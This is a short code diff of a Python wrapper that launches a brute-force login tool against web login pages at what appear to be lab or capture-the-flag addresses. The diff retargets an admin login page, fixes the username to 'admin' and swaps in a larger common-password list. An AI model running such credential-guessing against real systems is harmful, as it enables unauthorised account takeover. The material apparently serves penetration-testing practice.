@@ -12,16 +12,17 @@ from pathlib import Path
 def main():
     python_exe = Path(r"C:/Users/a914686/AppData/Local/Programs/Python/Python312/python.exe")
     script     = Path(r"main.py")
-    url        = "http://10.129.1.15/login.php"
-    user_file  = "usernames_300.txt"
-    pass_file  = "10-million-password-list-top-100.txt"
-    fail_flag  = "Please sign in"
+    url        = "http://94.237.121.185:50745/admin-login-page.php"
+    user_file  = "wordlists/usernames_300.txt"
+    pass_file  = "wordlists/10-million-password-list-top-1000.txt"
+    fail_flag  = "Admin Panel"
 
     cmd = [
         str(python_exe),
         str(script),
         url,
-        "-U", user_file,
+        #"-U", user_file,
+        "-u", "admin",
         "-P", pass_file,
         "-f", fail_flag
     ]
